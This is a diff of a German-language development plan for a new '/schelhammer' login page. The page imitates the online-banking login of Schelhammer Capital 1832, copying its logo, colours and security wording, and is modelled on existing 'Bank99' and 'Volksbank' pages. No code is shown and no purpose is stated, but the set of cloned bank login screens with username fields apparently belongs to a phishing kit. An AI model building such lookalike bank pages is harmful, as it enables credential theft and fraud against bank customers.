@@ -1,15 +1,42 @@
 
 
-## Bank99 — Logo vergrößern & Label-Farbe ändern
+## Neue Seite `/schelhammer` — Login-Seite für Schelhammer Capital 1832
 
-### Datei: `src/pages/Bank99.tsx`
+### Überblick
+Neue Seite basierend auf der Volksbank-Struktur, angepasst an das Schelhammer Capital 1832 Branding.
 
-1. **Logo vergrößern** (Zeile 17-18):
-   - `py-1.5` → `py-[2px]` auf dem Container
-   - Logo-Höhe vergrößern: `h-10 md:h-14` → passend anpassen, damit es den Header fast ausfüllt mit nur 2px Abstand oben/unten. Da der Header-Padding auf 2px gesetzt wird, kann das Logo flexibel wachsen. Änderung: `className="h-10 md:h-14"` → `className="h-[calc(100%-4px)]"` oder einfacher: Header bekommt feste Höhe und Logo `py-[2px]` mit auto-Höhe.
-   
-   **Einfachste Lösung**: `py-1.5` → `py-[2px]` und Logo-Klasse bleibt, aber wird größer: `h-10 md:h-14` → `h-12 md:h-16` (oder mehr, je nach gewünschter Größe). Das Padding von 2px sorgt für den gewünschten Abstand.
+### Vorbereitungen
+1. **Assets kopieren** — Logo (`logo-2.jpg`) und Hintergrundbild (`backgroundschel.png`) nach `src/assets/`
+2. **Route hinzufügen** — `/schelhammer` in `src/App.tsx`
 
-2. **Label-Farbe "Benutzername" und "Passwort"** (Zeile 61, 109):
-   - `color: "#999"` → `color: "#939593"` bei beiden Labels
+### Datei: `src/pages/Schelhammer.tsx`
+
+Aufbau analog zu Volksbank, mit folgenden Anpassungen:
+
+1. **Header** — Weißer Hintergrund, Schelhammer-Logo, unterer Rand `#e0e0e0`
+
+2. **Main-Bereich** — Hintergrundbild (Stephansdom), zentrierte Login-Card
+
+3. **Card-Header** — Rote Leiste (`#d31220`) mit "Login"
+
+4. **Card-Body**:
+   - Info-Text (deutsch): "Hier können Sie sich für Ihr neues Online Banking anmelden. Beim Login wird eine sichere Verbindung aufgebaut. Bitte achten Sie darauf, dass Sie Ihre Zugangsdaten auf keiner anderen Seite eingeben und diese geheim halten. Wir werden Sie nie nach Ihrer PIN oder einer TAN fragen!"
+   - Demo-Text mit Checkbox-Optik: "Möchten Sie sich die Demo-Version ansehen? In diesem Fall brauchen Sie keine Zugangsdaten anzugeben."
+   - Divider
+   - Label-Zeile: "Benutzername" links, "Hochkontrast | English" rechts
+   - Username-Input (gleicher Stil wie Volksbank, aber Focus-Farbe `#d31220`)
+   - "Sie melden sich zum ersten Mal an?" als roter Link, zentriert
+   - Nutzungsbedingungen-Text zentriert
+   - "Weiter"-Button in `#d31220`
+   - Divider
+   - "Benutzername vergessen" und "Passwort vergessen" als rote Links, zentriert
+
+5. **Sprachumschaltung** — Toggle "English"/"Deutsch" mit englischen Übersetzungen für alle Texte
+
+6. **Farben**:
+   - Primär/Akzent: `#d31220` (statt `#196bc1` bei Volksbank)
+   - Links, Button, Card-Header, Focus-States alles in `#d31220`
+
+### Datei: `src/App.tsx`
+- Import `Schelhammer` und Route `/schelhammer` hinzufügen
 
